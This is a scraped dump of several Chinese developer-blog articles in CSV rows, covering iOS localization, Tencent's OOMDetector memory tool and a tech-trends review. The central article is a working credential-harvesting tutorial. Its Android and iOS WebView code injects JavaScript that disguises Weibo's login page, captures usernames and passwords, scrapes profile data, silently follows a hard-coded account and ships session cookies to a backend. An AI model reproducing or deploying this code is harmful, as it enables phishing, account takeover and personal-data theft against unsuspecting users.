<p>利用脚本保持Base和其它语言环境的本地化UI元素一致：<a href=""https://raw.githubusercontent.com/mokai/iOS-i18n/master/i18n/RunScript/AutoGenStrings.py"" rel=""nofollow noreferrer"">脚本文件</a><br>  此方法<a href=""http://blog.csdn.net/VictorMoKai/article/details/48894873"" rel=""nofollow noreferrer"">参考文章</a>，在TARGETS -&gt; Build Phases -&gt;  Run Script（没有可以左上角“+”）增添脚本代码：</p>
<pre><code class=""shell"">python  脚本本地路径()  storyboard/xib路径(会自动遍历和查找子目录)</code></pre>
</li>
<li>链接到代码中利用代码本地化（类似文本本地化）</li>
</ol>
<h2>七. 后记</h2>
<p>工程目录：每种语言都有自己的文件夹xx.lproj，加载资源时从相应语言文件夹下加载。</p>
<p><a href=""https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPInternational/LocalizingYourApp/LocalizingYourApp.html"" rel=""nofollow noreferrer"">本地化官方文档地址</a></p>

                ", iOS应用本地化,1531971898,487,1,922,1,1,https://segmentfault.com/a/1190000013206628
31,1,0,6,"
                    
<p><a href=""https://github.com/zgbgx/appWeiboInfoCrawl"" rel=""nofollow noreferrer"">github地址</a></p>
<h1>项目目的</h1>
<p>在app(ios和android)端使用webview组件与js进行交互，串改页面，让用户授权登录后，获取用户关键信息，并完成自动关注一个账号。</p>
<h1>传统爬虫模式的局限</h1>
<p>传统爬虫模式，让用户在客户端在输入账号密码，然后传送到后端进行登录，爬取信息，这种方式将要面对各种人机验证措施，加密方法复杂的情况下，还得选择selenium，性能更无法保证。同时，对于个人账户，安全措施越来越严，使用代理ip进行操作，很容易造成异地登录等问题，代理ip也很可能在全网被重复使用的情况下，被封杀，频繁的代理ip切换也会带来需要二次登录等问题。<br>所以这两年年来，发现市面上越来越多的提供sdk方式的数据提供商，经过抓包及反编译sdk，发现其大多数使用webview载入第三方页面的方式完成登录，有的在登录完成之后，获取cookie传送到后端完成爬取，有的直接在app内完成所需信息的收集。</p>
<h1>登录</h1>
<p>这是微博移动端登录页<br><span class=""img-wrap""><img data-src=""/img/remote/1460000013229248"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""weibo原移动端登录页.png"" title=""weibo原移动端登录页.png""></span><br>首先使用JavaScript串改当前页面元素，让用户没法意识到这是微博官方的登录页。</p>
<h2>载入页面</h2>
<p>android</p>
<pre><code>webView.loadUrl(LOGINPAGEURL);</code></pre>
<p>iOS</p>
<pre><code>[self requestUrl:self.loginPageUrl];
//请求url方法
-(void) requestUrl:(NSString*) urlString{
    NSURL* url=[NSURL URLWithString:urlString];
    NSURLRequest* request=[NSURLRequest requestWithURL:url];
    [self.webView loadRequest:request];
}</code></pre>
<h2>js代码注入</h2>
<p>首先我们注入js代码到app的webview中<br>android</p>
<pre><code>private void injectScriptFile(String filePath) {
        InputStream input;
        try {
            input = webView.getContext().getAssets().open(filePath);
            byte[] buffer = new byte[input.available()];
            input.read(buffer);
            input.close();
            // String-ify the script byte-array using BASE64 encoding
            String encoded = Base64.encodeToString(buffer, Base64.NO_WRAP);
            String funstr = ""javascript:(function() {"" +
                    ""var parent = document.getElementsByTagName('head').item(0);"" +
                    ""var script = document.createElement('script');"" +
                    ""script.type = 'text/javascript';"" +
                    ""script.innerHTML = decodeURIComponent(escape(window.atob('"" + encoded + ""')));"" +
                    ""parent.appendChild(script)"" +
                    ""})()"";
            execJsNoReturn(funstr);
        } catch (IOException e) {
            Log.e(TAG, ""injectScriptFile: "" + e);
        }
    }</code></pre>
<p>iOS</p>
<pre><code>//注入js文件
- (void) injectJsFile:(NSString *)filePath{
    NSString *jsPath = [[NSBundle mainBundle] pathForResource:filePath ofType:@""js"" inDirectory:@""assets""];
    NSData *data=[NSData dataWithContentsOfFile:jsPath];
    NSString *responData =  [data base64EncodedStringWithOptions:0];
    NSString *jsStr=[NSString stringWithFormat:@""javascript:(function() {\
                     var parent = document.getElementsByTagName('head').item(0);\
                     var script = document.createElement('script');\
                     script.type = 'text/javascript';\
                     script.innerHTML = decodeURIComponent(escape(window.atob('%@')));\
                     parent.appendChild(script)})()"",responData];
    [self.webView evaluateJavaScript:jsStr completionHandler:^(id _Nullable htmlStr,NSError * _Nullable error){
        
    }];
}</code></pre>
<p>我们都采用读取js文件，然后base64编码后，使用window.atob把其做为一个脚本注入到当前页面(注意：window.atob处理中文编码后会得到的编码不正确，需要使用ecodeURIComponent escape来进行正确的校正。)<br>在这里已经使用了app端，调用js的方法来创建元素。</p>
<h2>app端调用js方法</h2>
<p>android端：</p>
<pre><code>webView.evaluateJavascript(funcStr, new ValueCallback&lt;String&gt;() {
            @Override
            public void onReceiveValue(String s) {

            }

        });</code></pre>
<p>ios端：</p>
<pre><code>[self.webView evaluateJavaScript:funcStr completionHandler:^(id _Nullable htmlStr,NSError * _Nullable error){
        
    }];</code></pre>
<p>这两个方法可以获取返回值，正因为如此，可以使用js提取页面信息后，返回给webview，然后收集信息完成之后，汇总进行通信。</p>
<h1>js串改页面</h1>
<pre><code>//串改页面元素，让用户以为是授权登录
function getLogin(){
 var topEle=selectNode('//*[@id=""avatarWrapper""]');
 var imgEle=selectNode('//*[@id=""avatarWrapper""]/img');
 topEle.remove(imgEle);
 var returnEle=selectNode('//*[@id=""loginWrapper""]/a');
 returnEle.className='';
 returnEle.innerText='';
 pEle=selectNode('//*[@id=""loginWrapper""]/p');
 pEle.className="""";
 pEle.innerHTML="""";
 footerEle=selectNode('//*[@id=""loginWrapper""]/footer');
 footerEle.innerHTML="""";
 var loginNameEle=selectNode('//*[@id=""loginName""]');
 loginNameEle.placeholder=""请输入用户名"";
 var buttonEle=selectNode('//*[@id=""loginAction""]');
 buttonEle.innerText=""请进行用户授权"";
 selectNode('//*[@id=""loginWrapper""]/form/section/div[1]/i').className="""";
 selectNode('//*[@id=""loginWrapper""]/form/section/div[2]/i').className="""";
 selectNode('//*[@id=""loginAction""]').className=""btn"";
 selectNode('//a[@id=""loginAction""]').addEventListener('click',transPortUnAndPw,false);
 return window.webkit;
}
function transPortUnAndPw(){
 username=selectNode('//*[@id=""loginName""]').value;
 pwd=selectNode('//*[@id=""loginPassword""]').value;
 window.webkit.messageHandlers.getInfo({body:JSON.stringify({""username"":username,""pwd"":pwd})});
}</code></pre>
<p>使用js修改页面元素，使之看起来不会让人发觉这是weibo官方的页面。<br>修改后的页面如图：<br><span class=""img-wrap""><img data-src=""/img/remote/1460000013229249"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""修改后登录页面.png"" title=""修改后登录页面.png""></span></p>
<h1>串改登录点击事件，获取用户名密码</h1>
<pre><code>selectNode('//a[@id=""loginAction""]').addEventListener('click',transPortUnAndPw,false);
function transPortUnAndPw(){
  username=selectNode('//*[@id=""loginName""]').value;
  pwd=selectNode('//*[@id=""loginPassword""]').value;
  window.webkit.messageHandlers.getInfo({body:JSON.stringify({""username"":username,""pwd"":pwd})});
}</code></pre>
<p>同时串改登录点击按钮，通过js调用app webview的方法，把用户名和密码传递给app webview 完成信息收集。</p>
<h2>js调用webview的方法</h2>
<p>android端：</p>
<pre><code>// js代码
window.weibo.getPwd(JSON.stringify({""username"":username,""pwd"":pwd}));
//Java代码
webView.addJavascriptInterface(new WeiboJsInterface(), ""weibo"");
public class WeiboJsInterface {
        @JavascriptInterface
        public void getPwd(String returnValue) {
            try {
                unpwDict = new JSONObject(returnValue);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }</code></pre>
<p>android通过实现一个@JavaScriptInterface接口，把这个方法添加类添加到webview的浏览器内核之上，当调用这个方法时，会触发android端的调用。<br>ios端：</p>
<pre><code>//js代码
window.webkit.messageHandlers.getInfo({body:JSON.stringify({""username"":username,""pwd"":pwd})});
//oc代码
WKUserContentController *userContentController = [[WKUserContentController alloc] init];
 [userContentController addScriptMessageHandler:self name:@""getInfo""];

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message
{
    
    self.unpwDict=[self getReturnDict:message.body];
}</code></pre>
<p>ios方式，实现方式与此类似，不过由于我对oc以及ios开发不熟悉，代码运行不符合期望,希望专业的能指正。</p>
<h1>个人信息获取</h1>
<h2>直接提取页面的难点</h2>
<p>webview这个组件，无论是在android端 onPageFinished方法还是ios端的didFinishNavigation方法，都无法正确判定页面是否加载完全。所以对于很多页面，还是选择走接口</p>
<h1>请求接口</h1>
<p>本项目中，获取用户自己的微博，关注，和分析，都是使用接口，拿到预览页，直接解析数，对于关键的参数，需要仔细抓包获取<br><span class=""img-wrap""><img data-src=""/img/remote/1460000013229250"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""抓包1.png"" title=""抓包1.png""></span><br>仔细分析 “我”这个标签下的请求情况，发现<a href=""https://m.weibo.cn/home/me?format=cards%E8%BF%99%E4%B8%AA%E9%93%BE%E6%8E%A5%E5%8C%85%E5%90%AB%E7%94%A8%E6%88%B7%E6%A0%B8%E5%BF%83%E6%95%B0%E6%8D%AE"" rel=""nofollow noreferrer"">https://m.weibo.cn/home/me?fo...</a>，通过这个请求，获取核心参数，然后，获取用户的微博 关注 粉丝的预览页面。<br>然后通过</p>
<pre><code>JSON.stringify(JSON.parse(document.getElementsByTagName('pre')[0].innerText))</code></pre>
<p>获取json字符串，并传到app端进行解析。<br>解析及多次请求的逻辑</p>
<h1>请求页面</h1>
<p>也有页面，如个人资料，页面较简单，可以使用js提取</p>
<h3>js代码</h3>
<pre><code>function getPersonInfo(){
  var name=selectNodeText('//*[@id=""J_name""]');
  var sex=selectNodeText('/*[@id=""sex""]/option[@selected]');
  var location=selectNodeText('//*[@id=""J_location""]');
  var year=selectNodeText('//*[@id=""year""]/option[@selected]');
  var month=selectNodeText('//*[@id=""month""]/option[@selected]');
  var day=selectNodeText('//*[@id=""day""]/option[@selected]');
  var email=selectNodeText('//*[@id=""J_email""]');
  var blog=selectNodeText('//*[@id=""J_blog""]');
  if(blog=='输入博客地址'){
    blog='未填写';
  }
  var qq=selectNodeText('//*[@id=""J_QQ""]');
  if(qq=='QQ帐号'){
    qq=""未填写"";
  }
  birthday=year+'-'+month+'-'+day;
  theDict={'name':name,'sex':sex,'localtion':location,'birthday':birthday,'email':email,'blog':blog,'qq':qq};
  return JSON.stringify({'personInfomation':theDict});
}</code></pre>
<p>由于webview不支持 $x 的xpath写法，为了方便，使用原生的XPathEvaluator, 实现了特定的提取。</p>
<pre><code>function selectNodes(sXPath) {
  var evaluator = new XPathEvaluator();
  var result = evaluator.evaluate(sXPath, document, null, XPathResult.ANY_TYPE, null);
  if (result != null) {
    var nodeArray = [];
    var nodes = result.iterateNext();
    while (nodes) {
      nodeArray.push(nodes);
      nodes = result.iterateNext();
    }
    return nodeArray;
  }
  return null;
};
//选取子节点
function selectChildNode(sXPath, element) {
  var evaluator = new XPathEvaluator();
  var newResult = evaluator.evaluate(sXPath, element, null, XPathResult.ANY_TYPE, null);
  if (newResult != null) {
    var newNode = newResult.iterateNext();
    return newNode;
  }
}

function selectChildNodeText(sXPath, element) {
  var evaluator = new XPathEvaluator();
  var newResult = evaluator.evaluate(sXPath, element, null, XPathResult.ANY_TYPE, null);
  if (newResult != null) {
    var newNode = newResult.iterateNext();
    if (newNode != null) {
      return newNode.textContent.replace(/(^\s*)|(\s*$)/g, """"); ;
    } else {
      return """";
    }
  }
}

function selectChildNodes(sXPath, element) {
  var evaluator = new XPathEvaluator();
  var newResult = evaluator.evaluate(sXPath, element, null, XPathResult.ANY_TYPE, null);
  if (newResult != null) {
    var nodeArray = [];
    var newNode = newResult.iterateNext();
    while (newNode) {
      nodeArray.push(newNode);
      newNode = newResult.iterateNext();
    }
    return nodeArray;
  }
}

function selectNodeText(sXPath) {
  var evaluator = new XPathEvaluator();
  var newResult = evaluator.evaluate(sXPath, document, null, XPathResult.ANY_TYPE, null);
  if (newResult != null) {
    var newNode = newResult.iterateNext();
    if (newNode) {
      return newNode.textContent.replace(/(^\s*)|(\s*$)/g, """"); ;
    }
    return """";
  }
}
function selectNode(sXPath) {
  var evaluator = new XPathEvaluator();
  var newResult = evaluator.evaluate(sXPath, document, null, XPathResult.ANY_TYPE, null);
  if (newResult != null) {
    var newNode = newResult.iterateNext();
    if (newNode) {
      return newNode;
    }
    return null;
  }
}</code></pre>
<h1>自动关注用户</h1>
<p>由于个人微博页面 onPageFinished与didFinishNavigation这两个方法无法判定页面是否加载完全，<br>为了解决这个问题，在android端，使用拦截url，判定页面加载图片的数量来确定，是否，加载完全</p>
<pre><code>//由于页面的正确加载onPageFinieshed和onProgressChanged都不能正确判定，所以选择在加载多张图片后，判定页面加载完成。
            //在这样的情况下，自动点击元素，完成自动关注用户。
            @Override
            public void onLoadResource(WebView view, String url) {
                if (webView.getUrl().contains(AUTOFOCUSURL) &amp;&amp; url.contains(""jpg"")) {
                    newIndex++;
                    if (newIndex == 5) {
                        webView.post(new Runnable() {
                            @Override
                            public void run() {
                                injectJsUseXpath(""autoFocus.js"");
                                execJsNoReturn(""autoFocus();"");
                            }
                        });
                    }
                }
                super.onLoadResource(view, url);
            }</code></pre>
<p>js 自动点击</p>
<pre><code>function autoFocus(){
  selectNode('//span[@class=""m-add-box""]').click();
}</code></pre>
<p>在ios端，使用访问接口的方式<br><span class=""img-wrap""><img data-src=""/img/remote/1460000013229251"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""抓包2.png"" title=""抓包2.png""></span><br>除了目标用户的id外，还有一个st字符串，通过chrome的search，定位，然后通过js提取</p>
<pre><code>function getSt(){
  return config['st'];
}</code></pre>
<p>然后构造post，请求，完成关注</p>
<pre><code>- (void) autoFocus:(NSString*) st{
    //Wkwebview采用js模拟完成表单提交
    NSString *jsStr=[NSString stringWithFormat:@""function post(path, params) {var method = \""post\""; \
                     var form = document.createElement(\""form\""); \
                     form.setAttribute(\""method\"", method); \
                     form.setAttribute(\""action\"", path); \
                     for(var key in params) { \
                     if(params.hasOwnProperty(key)) { \
                     var hiddenField = document.createElement(\""input\"");\
                     hiddenField.setAttribute(\""type\"", \""hidden\"");\
                     hiddenField.setAttribute(\""name\"", key);\
                     hiddenField.setAttribute(\""value\"", params[key]);\
                     form.appendChild(hiddenField);\
                     }\
                     }\
                     document.body.appendChild(form);\
                     form.submit();\
                     }\
                     post('https://m.weibo.cn/api/friendships/create',{'uid':'1195242865','st':'%@'});"",st];
    [self execJsNoReturn:jsStr];
}</code></pre>
<p>ios WkWebview没有post请求，接口，所以构造一个表单提交，完成post请求。<br>完成，一个自动关注，当然，构造一个用户id的列表，很简单就可以实现自动关注多个用户。</p>
<h1>关于cookie</h1>
<p>如果需要爬取的数据量大，可以选择爬取少量关键信息后，把cookie传到后端处理<br>android 端 cookie处理</p>
<pre><code>CookieSyncManager.createInstance(context);  
CookieManager cookieManager = CookieManager.getInstance(); </code></pre>
<p>通过cookieManage对象可以获取cookie字符串，传送到后端，继续爬取</p>
<p>ios端cookie处理</p>
<pre><code>NSDictionary *cookie = [AppInfo shareAppInfo].userModel.cookies;</code></pre>
<p>处理方式与android端类似。</p>
<h1>总结</h1>
<p>对于数据工程师来说，webview有点类似于selenium，但是运行在服务端的selenium，有太多的局限性。webview的在客户端运行，就像一个用户就是一台肉机。<br>以webview为基础，使用app收集信息加以利用，现阶段大多数人都还没意识到，但是，市场上的产品已经越来越多，特别是那些对数据有特殊需要的各种金融机构。<br>对于普通用户来说，不要轻易在一个app上登录第三方账户，信息泄露，财产损失，在按下登录或者本例中的假装授权后，都是不可避免的。</p>

                ", app端用户信息自动获取--微博,1531971900,203,1,663,1,1,https://segmentfault.com/a/1190000013189997
32,1,0,6,"
                    
<h1>组件介绍</h1>
<p>OOMDetector是手Q自研的IOS内存监控组件，腾讯内部目前已有多个App接入了OOMDetector，它主要有以下两个功能：</p>
<ul>
<li>爆内存堆栈统计：负责记录进程内存分配堆栈和内存块大小，在爆内存时Dump堆栈数据到磁盘</li>
<li>内存泄漏检测：检测内存泄漏，目前支持Malloc内存块和OC对象的泄漏检测</li>
</ul>
<p>OOMDetector可以快速帮助开发者发现和定位App爆内存问题和内存泄漏，组件目前已经在Github开源，源码地址：<a href=""https://github.com/Tencent/OOMDetector"" rel=""nofollow noreferrer"">https://github.com/Tencent/OO...</a>。</p>
<h1>背景</h1>
<p>目前业内已有一些比较的IOS内存分析工具，下面逐个介绍这些工具的功能以及它们在使用上的不足。</p>
<h2>Allocation</h2>
<p>作为IOS开发，我们都很熟悉苹果官方提供的Allocation内存分析工具，在开发调试阶段，可以用Allocation详细分析App各模块内存占用。Allocation对App的内存监控比较全面，能监控到所有堆内存以及部分VM内存分配。虽然Allocation的功能比较强大，但是它也有比较明显的使用局限性，主要表现为以下两点：</p>
<ul>
<li>无法独立在App运行，只能在调试阶段连接Mac使用</li>
<li>性能较差，大型App开启后容易引发卡死</li>
</ul>
<p>这两点限制决定了Allocation只适合于在开发阶段辅助分析代码中存在的内存问题，而无法直接对线上用户的问题进行监控和定位。</p>
<h2>FBAllocationTracker</h2>
<p>FBAllocationTracker是Facebook开源的内存分析工具，它的原理是用 Method Swizzling替换原本的alloc方法，这样可以在App运行时记录所有OC实例的分配信息，帮助App在运行阶段发现一些OC对象的异常增长问题。相比Allocation，FBAllocationTracker对App性能影响较低，可以在App中独立运行。但是这个工具也有比较明显的缺陷：</p>
<ul>
<li>监控范围不够全面，只能监控OC对象，不能监控C++对象和malloc内存块以及VM内存</li>
<li>没有内存对象分配的堆栈信息，对于开发者来说很难只通过对象的类型和数量定位到内存增长的原因</li>
</ul>
<p>综上所述，FBAllocationTracker虽然能独立在App中运行，但是监控的内存范围太小，同时记录的对象信息也过于简单，对于分析内存问题帮助十分有限。</p>
<p>内存问题一直是手Q的关注重点，为了保证线上大盘用户的内存质量，我们希望有一款工具能够帮助监控和定位线上用户的内存问题。基于这样的背景，我们团队自研了OOMDetector组件。OOMDetector通过Hook系统底层的内存分配方法，能够记录到进程所有内存分配的堆栈信息，同时组件能够在对性能流畅度影响不大的情况下能够保证在App中独立运行，可以方便用于分析和监控线上用户的内存问题（爆内存或者内存泄漏问题）。</p>
<h1>组件原理</h1>
<h2>爆内存堆栈统计</h2>
<p><strong>爆内存堆栈监控原理</strong></p>
<p>爆内存堆栈监控的实现原理如图1所示，通过Hook IOS系统底层内存分配的相关方法（包括malloc_zone相关的堆内存分配以及vm_allocate对应的VM内存分配方法），跟踪并记录进程中每个对象内存的分配信息，包括分配堆栈、累计分配次数、累计分配内存等，这些信息也会被缓存到进程内存中。在内存触顶的时候，组件会定时Dump这些堆栈信息到本地磁盘，这样如果程序爆内存了，就可以将爆内存前Dump的堆栈数据上报到后台服务器进行分析。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012825291?w=572&amp;h=288"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>图1 爆内存监控原理</p>
<p><strong>性能挑战</strong></p>
<p>App的内存分配方法的调用频率非常高，在大型App中可能高达10W/次每秒。要Hook这类方法对组件的性能来说是极大的挑战，因为如果组件本身耗时的话就很容易导致App卡顿甚至卡死。在OOMDetector中，我们对Hook方法代码的执行效率进行了严格控制，也采取了一些策略对Hook方法中耗时较多的堆栈回溯和锁等待进行了优化：</p>
<ul><li>优化堆栈回溯方法</li></ul>
<p>对于堆栈回溯，系统提供了backtrace_symbols方法可以直接获取堆栈信息，但是这个方法特别耗时。所以我们根据堆栈的回溯原理实现了更高效的堆栈回溯方法，优化后的方法在运行时只会获取堆栈函数的地址信息，在回写磁盘的时候再根据动态库的地址范围拼装成如图2所示堆栈格式（类似Crash堆栈），后台服务器利用atos命令和符号表文件就可以还原出对应的堆栈内容。通过这种方式可以把耗时较高的符号还原工作放到服务器端，客户端只需要执行耗时较少的堆栈函数地址回溯操作，优化后的堆栈回溯方法耗时低于1us。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012825292?w=369&amp;h=245"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>图2 堆栈格式</p>
<ul><li>优化锁等待耗时</li></ul>
<p>对于多线程的内存分配，为了保证线程安全，堆栈数据的插入操作必须要上锁。对于这种高频调用的方法，锁的性能是我们最关心的指标。IOS开发中NSLock和@synchronized是比较常用的，那么这两种锁的性能如何呢？</p>
<p>我们通过测试代码对IOS中常用的锁进行了测试，总结了图2所示的各种锁的性能比较图，根据图3的测试结果，NSLock和@synchronized的性能要低于pthread_mutex，性能最好的是自旋锁OSSpinLock。</p>
<p>自旋锁的原理是，如果自旋锁已经被别的执行单元保持，调用者就一直循环等待锁的释放。相比互斥锁而言，自旋锁不会引起调用者休眠，节省了线程休眠的状态切换，所以有更高的效率，但代价是增加了cpu的使用率。对于我们的场景，因为需要上锁部分的代码执行耗时较少，采用OSSpinLock的自旋锁并不会显著增加cpu的使用率，所以我们优先考虑锁的效率采用了OSSpinLock的方案。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012825293?w=640&amp;h=417"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>图3 各种锁的性能比较</p>
<p><strong>堆栈聚类和压缩</strong></p>
<p>之前提到，我们的Hook方法会缓存每个内存分配的堆栈数据。假设App的内存块个数为25W，堆栈平均深度20行，每个堆栈地址采用8字节的整型数据存储，那么25W个堆栈数据将占用40M的内存空间。显然这样的内存增长对于任何App都是不可承受的，所以我们需要对组件的内存占用进行优化。</p>
<p>我们分析爆内存问题时候，只需要分析那些内存占用较大的堆栈，基本不用关心那些内存占用较小的堆栈。所以我们的优化思路也很明确：只保留内存占用较大的堆栈。要完成这个工作就必须对内存中所有堆栈先进行聚类合并，统计出每个堆栈累计的内存值。</p>
<p>具体的优化策略如图4所示，对于每个记录到的分配堆栈，首先通过md5算法将堆栈数据压缩为16字节的md5，通过md5值进行聚类，缓存中只保留16字节的md5数据，只有当某个堆栈的累计内存超过一定阀值时，才会保留原始堆栈信息，这样因为超过阀值的堆栈数量有限，堆栈原始信息占用的空间几乎就可以忽略不计了。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012825294?w=562&amp;h=267"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>图4 堆栈聚类和压缩原理</p>
<p>采用两种方式可以将堆栈降低到优化前的1/40左右，优化后的组件内存基本不会对App的内存造成太大影响。</p>
<p><strong>数据Dump方案</strong></p>
<p>前面提到，在内存触顶后要将内存中的堆栈数据定时Dump到磁盘中，常规的方案是IO接口直接把数据写入到磁盘。因为数据Dump的频率较高，频繁的IO操作会导致程序卡顿。因为数据Dump的操作是非常高频的，所以我们采用了效率更高的mmap方式。</p>
<p>mmap是一种内存映射文件的方法，即将一个文件或者其它对象映射到进程的地址空间。实现这样的直接映射关系后，写文件的过程进程不会有额外的文件的数据拷贝操作，避免了内核空间和用户空间的频繁切换，如图5所示。根据我们的代码实测，向mmap映射空间写数据的性能与直接写内存一致，效率远高于IO操作。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012825295?w=488&amp;h=324"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>图5 内存映射原理</p>
<p>那么mmap的回写时机是怎样的？根据官方文档描述，主要有如下时机：</p>
<ul>
<li>系统内存不足时</li>
<li>进程crash时</li>
<li>主动调用 msync时</li>
</ul>
<p>mmap 在内存不足时会主动进行回写操作，这样的机制也保证我们的监控组件能在程序爆内存前将缓存中的数据回写到磁盘，从这一点看采用mmap的方式相比常规IO操作也有更强可靠性。</p>
<p><strong>内存泄漏检测</strong></p>
<p>除了爆内存堆栈监控，OOMDetector还集成了内存泄漏检测功能，能够检测Malloc内存块和OC对象的“无主内存泄漏”。所谓“无主内存泄漏”是指内存块在进程内已经没有引用却无法正常释放的内存块。</p>
<p>按照之前介绍的方案，OOMDetector可以记录到每一个对象的分配堆栈信息，要从这些对象中找出 “泄漏对象”，我们需要知道在程序可访问的进程内存空间中，是否有“指针变量”指向对应的内存块，那些在整个进程内存空间都没有指针指向的内存块，就是我们要找的泄漏内存块。如图2所示，在IOS系统中，可能包含指针变量的内存区域有堆内存、栈内存、全局数据区和寄存器，OOMDetector 通过对这些区域遍历扫描即可找到所有可能的“指针变量”，整个扫描流程结束后都没有“指针变量”指向的内存块即是泄漏内存块。</p>
<p>为了避免内存访问冲突，扫描过程需要挂起所有线程，整个过程会卡住程序1-2秒。因为扫描过程较为耗时，这个功能目前主要用于App的测试阶段，与自动化测试结合可快速高效的发现泄漏问题。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012825296?w=858&amp;h=472"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>图6 内存泄漏检测原理</p>
<h1>展望</h1>
<p>开源只是开始，我们后续仍会不断对OOMDetector组件进行改进，也欢迎大家对组件多提意见。如果你的IOS应用也在受到内存问题困扰或者你也对IOS内存监控技术感兴趣，那么来了解下我们的组件吧！</p>

                ", 【腾讯开源】iOS爆内存问题解决方案-OOMDetector组件,1531971902,239,1,585,1,1,https://segmentfault.com/a/1190000012825286
33,1,0,6,"
                    
<p>软件开发不是一份稳定的工作：每年都会涌现一个又一个新的技术，每隔几年都会出现一些革命性的技术。尽管从代码、表现及差异上来看，新技术和旧的技术有一些概念上的相似，但是在使用的过程中，仍然是需要花费时间去学习的。</p>
<p>除了，加深自己对现有一些语言、技术、软件工程的领域深度。为了保持一定的技术洞见，每年我们都会学习一些新的技术，使用一些新的技术栈。因此，这篇文章就是介绍一些我对于新技术的感受，以及在这一年学习中的一些经验。</p>
<p>本文主要包含以下内容：</p>
<ul>
<li>回顾前端：超越交互</li>
<li>回顾移动开发</li>
<li>技术投资策略</li>
<li>物联网与去中心化</li>
<li>AI 与技术成熟度</li>
<li>Serverless 与事件驱动</li>
<li>区块链评估</li>
</ul>
<p>（PS：本文的阅读时间大概 10 分钟）</p>
<h2>回顾前端：超越交互</h2>
<p>年初，我在写电子书《我的职业是前端工程师》的时候，已经 “钦定” 了 React、Angular（没有.js）、Vue 作为未来前端开发的主流趋势。在国内来说，还是以 Vue 为主，Vue 好上手，但是不都是所有的用户都是小白 ：） 。但是作为一个前端开发人员，你把时间投资在 React 和 Angular 上，在未来你会有更大的赢面。</p>
<p>Facebook 一系的 React，还有 React Native 和 React VR，未来可能还会有 React Game。Angular 受<strong>奥斯本效应</strong>的影响，采用程度受到一定的影响。在目前来看，对于开发人员的主要成长得益于 TypeScript，对于项目的优势主要静态类型使得代码更加强壮。</p>
<p>可是这一年 AI 的火热，让我开发思考 AI 带来的一些交互上的变化。现在，我们所指的前端多数是一些 Web、移动端相关的 UI 开发，其本质就是与用户交互。诸如前几年火热的虚拟现实、智能音箱，都是一个交互的新入口。</p>
<p>可视化仍然是人类最好的<strong>获取数据</strong>的方式。可当用户大量的日常工作，被 AI 自动化之后，有些工作就变得有些多余。如你出门前要看的天气，以决定穿什么衣服，它都可以由计算机算出来。带不带雨伞，都可以由雨伞提醒你。如 Amazon 设计的 Dash Button，可以让你不需要任何的 UI 就可以购买日常用品。</p>
<h2>回顾移动开发</h2>
<p>今年，我在工作上主要做的都是移动开发相关的工作，从基于 Ionic 与 Cordova 的混合应用，到嵌入 WebView 到 React Native，再到年底的 Android 原生应用，中间写了一些 Cordova 和 React Native 的 Android、iOS 插件。也算是见证了移动应用的不同技术选型，成为了 3/4 个移动应用开发，对整个移动端的技术有所了解。</p>
<p>在最近几年里，原生移动应用开发没有像过去那么火热。一来是，受到混合应用和 React Native 的影响；二来是，移动端的开发技术已经趋于成熟；</p>
<p>尽管在年初，看到越来越多的原生应用开发人员正在转向 React Native。过去，我们认为的操作系统市场份额是这样的：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012729626?w=2314&amp;h=1160"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""桌面操作系统份额"" title=""桌面操作系统份额""></span></p>
<p>但是实际上，在讨论市场份额的时候已经是这样了：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012729627?w=2318&amp;h=1124"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""总的操作系统份额"" title=""总的操作系统份额""></span></p>
<p>以 VR、AR 和 AI 的技术趋势来看，移动平台才是未来的重点——除非有更好的平台出现。触手可及的技术，拥有更多的可能性，也拥有更多的数据及美好的未来。</p>
<h2>技术投资策略</h2>
<p>（PS：在这里，所谓的技术投资是指，在一定时期内向一定的新领域投放时间来学习新技术。）</p>
<p>新的技术每天都在不断地涌现，很多就是黑天鹅一样看不出。并且，一来我们已经习惯了新的轮子的产生，二来我们也<strong>没有那么多的精力</strong>去关心每一个新技术。可是当有一些技术在不断被<strong>提及被应用</strong>的时候，你就差不多应该关注、学习、采用了。</p>
<p>如我在年初看到那一本《灰犀牛》：<strong>灰犀牛体型笨重、反应迟缓，你能看见它在远处，却毫不在意，一旦它向你狂奔而来，定会让你猝不及防，直接被扑倒在地</strong>。你明明看得见，新的趋势在那里，却固执的不肯去了解。那么，未来你就轻松地进入了中午危机。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012729628"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""技术投资"" title=""技术投资""></span></p>
<p>在 Gartner 的技术曲线上，定义了五个阶段：科技诞生的促动期、过高期望的峰值、泡沫化的底谷期、稳步爬升的光明期、实质生产的高峰期。对于个人来说，这个技术曲线就没有那么复杂。</p>
<h3>成为早期投入者</h3>
